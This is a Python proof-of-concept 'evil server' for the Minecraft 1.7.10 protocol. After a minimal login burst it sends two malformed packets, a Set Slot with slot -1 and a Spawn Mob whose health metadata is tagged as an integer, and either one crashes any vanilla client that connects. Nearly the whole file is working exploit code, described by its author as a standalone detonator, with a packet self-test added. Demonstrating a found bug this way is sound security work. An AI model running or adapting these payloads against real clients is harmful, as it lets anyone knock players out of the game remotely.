#!/usr/bin/env python3
"""Evil 1.7.10 server PoC: serves the two client-crash exploits we found.

Point a vanilla 1.7.10 client at this server and watch it die:

  python3 evil_server.py --port 25570 --exploit cursor    # AIOOBE: -1
  python3 evil_server.py --port 25570 --exploit metadata  # CCE Integer->Float
  python3 evil_server.py --port 25570 --exploit both      # one after the other

Exploit 1 (S2F Set Slot, window=0 slot=-1):
  Vanilla NetHandlerPlayClient.handleSetSlot selects the cursor path only
  when windowId == -1. Any other window goes to
  openContainer.putStackInSlot(slot) -> Container.getSlot(slot), a bare
  ArrayList.get. With slot=-1 that throws ArrayIndexOutOfBoundsException: -1
  while ticking GuiDownloadTerrain. (Empty item still crashes: getSlot runs
  before the item is touched.)

Exploit 2 (S0F Spawn Mob, living metadata index 6 tagged int not float):
  Vanilla DataWatcher types are 0=byte 1=short 2=int 3=float. We tag the
  health entry (index 6) as type 2 carrying float bits. The client stores an
  Integer, and the first living-entity tick calls getWatchableObjectFloat(6)
  -> ClassCastException: Integer cannot be cast to Float.

Both are remotely triggerable by any server a 1.7.10 client connects to
(and were self-inflicted here before they were fixed). This script is the
standalone detonator: minimal valid login burst, then the malicious bytes.

`--selftest` builds every packet and re-parses it (no network needed).
"""
import argparse
import socket
import struct
import sys
import threading
import time

PROTO = 5


def enc_varint(n: int) -> bytes:
    if n < 0:
        n &= 0xFFFFFFFF
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += struct.pack("B", b | 0x80)
        else:
            return out + struct.pack("B", b)


def enc_string(s: str) -> bytes:
    b = s.encode("utf8")
    return enc_varint(len(b)) + b


def frame(pid: int, body: bytes) -> bytes:
    head = enc_varint(pid) + body
    return enc_varint(len(head)) + head


def read_frame(f) -> tuple[int, bytes]:
    def rv() -> int:
        n = 0
        shift = 0
        while True:
            b = f.read(1)
            if not b:
                raise EOFError("eof")
            v = b[0]
            n |= (v & 0x7F) << shift
            if not (v & 0x80):
                return n
            shift += 7

    ln = rv()
    raw = f.read(ln)
    if len(raw) != ln:
        raise EOFError("short frame")
    # split packet id (single varint) from body
    off = 0
    pid = 0
    shift = 0
    while True:
        v = raw[off]
        off += 1
        pid |= (v & 0x7F) << shift
        if not (v & 0x80):
            break
        shift += 7
    return pid, raw[off:]


# --- burst builders (all 1.7.10 play-state layouts) ---

def login_success(uuid: str, name: str) -> bytes:
    return frame(0x02, enc_string(uuid) + enc_string(name))


def join_game(eid: int) -> bytes:
    body = enc_varint(eid) + bytes((1, 0, 1, 20)) + enc_string("default")
    return frame(0x01, body)


def spawn_position(x: int, y: int, z: int) -> bytes:
    return frame(0x05, struct.pack(">iii", x, y, z))


def pos_look(x: float, y: float, z: float) -> bytes:
    body = struct.pack(">ddd", x, y, z) + struct.pack(">ff", 0.0, 0.0) + b"\x00"
    return frame(0x08, body)


def evil_setslot_cursor() -> bytes:
    """S2F with window=0, slot=-1, empty item. Vanilla: putStackInSlot(-1)."""
    body = b"\x00" + struct.pack(">h", -1) + struct.pack(">h", -1)
    return frame(0x2F, body)


def evil_spawn_mob(eid: int = 51) -> bytes:
    """S0F pig whose living baseline tags health (index 6) as int(2).

    Correct tag would be (3<<5)|6 = 0x66; 0x46 stores an Integer and the
    first entity tick throws ClassCastException on getFloat(6).
    """
    body = enc_varint(eid) + bytes((90,))
    body += struct.pack(">iii", int(12.0 * 32), int(64.0 * 32), int(14.0 * 32))
    body += bytes((0, 0, 0))  # yaw, pitch, head yaw
    body += struct.pack(">hhh", 0, 0, 0)  # velocity
    body += bytes((0x00, 0x00))  # (0<<5)|0 flags, byte 0
    body += bytes((0x21,)) + struct.pack(">h", 300)  # (1<<5)|1 air, short 300
    body += bytes((0x46,)) + struct.pack(">f", 20.0)  # (2<<5)|6 health AS INT
    body += bytes((0x7F,))  # end
    return frame(0x0F, body)


STATUS_JSON = (
    '{"version":{"name":"1.7.10","protocol":5},'
    '"players":{"max":1,"online":0},'
    '"description":{"text":"evil poc (will crash you)"}}'
)


def handle_client(conn: socket.socket, addr, exploit: str) -> None:
    peer = f"{addr[0]}:{addr[1]}"
    try:
        f = conn.makefile("rb")
        pid, body = read_frame(f)  # handshake
        # byte 0: packet id 0; then varint proto, string host, u16 port, varint next
        off = 0
        # skip proto varint
        while body[off] & 0x80:
            off += 1
        off += 1
        # skip host string
        slen, shift, n = 0, 0, 0
        while True:
            v = body[off]
            off += 1
            slen |= (v & 0x7F) << shift
            if not (v & 0x80):
                break
            shift += 7
        off += slen + 2
        nxt = body[off]
        if nxt == 1:  # status ping: answer, then close
            conn.sendall(frame(0x00, enc_string(STATUS_JSON)))
            pid2, body2 = read_frame(f)  # ping
            conn.sendall(frame(0x01, body2))
            print(f"[{peer}] status ping answered")
            return
        # login: read login-start, ignore name
        pid, body = read_frame(f)
        print(f"[{peer}] login start, sending burst + exploit={exploit}")
        conn.sendall(login_success("00000000-0000-0000-0000-000000000000", "Victim"))
        time.sleep(0.2)
        conn.sendall(join_game(7))
        conn.sendall(spawn_position(8, 64, 8))
        time.sleep(0.5)
        if exploit in ("cursor", "both"):
            pkt = evil_setslot_cursor()
            conn.sendall(pkt)
            print(f"[{peer}] sent evil S2F cursor (window=0 slot=-1), {len(pkt)} bytes")
            print(f"[{peer}] if the client just died in GuiDownloadTerrain: EXPLOIT WORKS")
        if exploit in ("metadata", "both"):
            time.sleep(0.5)
            conn.sendall(pos_look(8.5, 65.0, 8.5))
            time.sleep(0.5)
            pkt = evil_spawn_mob()
            conn.sendall(pkt)
            print(f"[{peer}] sent evil S0F pig (health as int), {len(pkt)} bytes")
            print(f"[{peer}] if the client just died ticking the pig: EXPLOIT WORKS")
        # linger so the client has time to chew on it; drain inbound junk
        conn.settimeout(8.0)
        try:
            while f.read(4096):
                pass
        except (socket.timeout, EOFError, OSError):
            pass
    except (EOFError, OSError, ConnectionError) as e:
        print(f"[{peer}] gone ({e})")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def selftest() -> int:
    fails = 0

    def check(name: str, cond: bool):
        nonlocal fails
        print(("ok  " if cond else "FAIL") + f" {name}")
        if not cond:
            fails += 1

    # S2F cursor: frame parses, window=0 slot=-1 item=-1
    raw = evil_setslot_cursor()
    fobj = __import__("io").BytesIO(raw)
    pid, body = read_frame(fobj)
    check("s2f id", pid == 0x2F)
    check("s2f window", body[0] == 0)
    check("s2f slot", struct.unpack_from(">h", body, 1)[0] == -1)
    check("s2f item empty", struct.unpack_from(">h", body, 3)[0] == -1)

    # S0F pig: frame parses, type 90, metadata carries (2,6) + 0x7F end
    raw = evil_spawn_mob(51)
    fobj = __import__("io").BytesIO(raw)
    pid, body = read_frame(fobj)
    check("s0f id", pid == 0x0F)
    check("s0f type pig", body[1] == 90)
    tail = body[-9:]  # 0x21,300 | 0x46,float | 0x7F
    check("s0f air entry", tail[0] == 0x21 and struct.unpack_from(">h", tail, 1)[0] == 300)
    check("s0f health tag is int(2)", tail[3] == 0x46)
    check("s0f health index 6", (tail[3] & 0x1F) == 6 and (tail[3] >> 5) == 2)
    check("s0f health bits", tail[4:8] == struct.pack(">f", 20.0))
    check("s0f terminator", tail[8] == 0x7F)

    # login burst frames parse back
    for name, pkt, want in (
        ("login_success", login_success("u", "n"), 0x02),
        ("join", join_game(7), 0x01),
        ("spawnpos", spawn_position(8, 64, 8), 0x05),
        ("poslook", pos_look(8.5, 65.0, 8.5), 0x08),
    ):
        fobj = __import__("io").BytesIO(pkt)
        pid, _ = read_frame(fobj)
        check(f"{name} id", pid == want)

    print("selftest: " + ("PASS" if fails == 0 else f"{fails} FAILURES"))
    return 1 if fails else 0


def main() -> int:
    ap = argparse.ArgumentParser(description="evil 1.7.10 server: serves client-crash exploits")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=25570)
    ap.add_argument("--exploit", choices=("cursor", "metadata", "both"), default="both")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        return selftest()
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.host, args.port))
    srv.listen(8)
    print(f"evil listening on {args.host}:{args.port} (exploit={args.exploit})")
    print("point a vanilla 1.7.10 client at it; <Ctrl-C> to stop")
    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(target=handle_client, args=(conn, addr, args.exploit), daemon=True).start()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
